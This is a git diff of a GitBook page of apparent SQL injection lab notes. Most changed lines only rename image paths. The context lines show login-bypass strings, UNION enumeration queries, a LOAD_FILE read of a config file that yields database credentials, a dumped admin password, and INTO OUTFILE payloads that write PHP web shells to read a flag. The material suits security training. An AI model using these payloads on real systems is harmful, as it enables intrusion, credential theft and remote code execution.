@@ -4,21 +4,21 @@
 
 ## Databases
 
-<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
 <figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## MySQL&#x20;
 
 ### Intro to MySQL
 
-<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**
 
@@ -28,7 +28,7 @@
 
 `show databases;`
 
-<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SQL Statements
 
@@ -80,7 +80,7 @@ UN: `tom'OR'1'='1`
 
 PW: anything...
 
-<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Using Comments
 
@@ -90,7 +90,7 @@ UN: `or id = 5 ) #`
 
 PW: anything...
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Union Clause
 
@@ -200,7 +200,7 @@ URL: [http://83.136.251.235:41930/shell.php?0=id](http://83.136.251.235:41930/sh
 
 URL: [http://83.136.251.235:41930/shell2.php](http://83.136.251.235:41930/shell2.php)
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
 ## Closing it Out
 
@@ -212,19 +212,19 @@ UN: `admin' or '1'='1'-- -`
 
 PW: any
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **DB enum**
 
 * `cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -`
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 * `cn' UNION select 1,database(),2,3,4-- -`
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 _OK, now we know that DB is called ilfreight_
 
@@ -234,14 +234,14 @@ _OK, now we know that DB is called ilfreight_
 
 cn' UNION SELECT 1, LOAD\_FILE("/var/www/html/config.php"), 3, 4, 5-- -
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 _OK, we obtained_:
 
 * DB\_USERNAME -> **root**
 * DB\_PASSWORD -> **password**
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>mysql access not working, continue on website</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption><p>mysql access not working, continue on website</p></figcaption></figure>
 
 **Writing files**
 
@@ -249,15 +249,15 @@ _OK, we obtained_:
 
 `cn' union select "",'<?php system("pwd"); ?>', "", "" into outfile '/var/www/html/shell1.php'-- -`
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>PERMISSION DENIED</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption><p>PERMISSION DENIED</p></figcaption></figure>
 
 `cn' union select "",table_name, "", "", "" from information_schema.tables where table_schema='backup' -- -`
 
-<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 `cn' union select "",username,password, "", "" from backup.admin_bk-- -`
 
-<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 **admin:Inl@n3\_fre1gh7\_adm!n**
 
@@ -265,10 +265,10 @@ _OK, we obtained_:
 
 URL: [http://94.237.56.188:36331/dashboard/shell.php](http://94.237.56.188:36331/dashboard/shell.php)
 
-<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 `cn' union select "",'<?php system("`**`cat /`flag\_cae1dadcd174.txt**`"); ?>',"", "", "" into outfile '/var/www/html/dashboard/`**`shell3.php`**`'-- -`
 
 URL: [http://94.237.56.188:36331/dashboard/shell3.php](http://94.237.56.188:36331/dashboard/shell3.php)
 
-<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
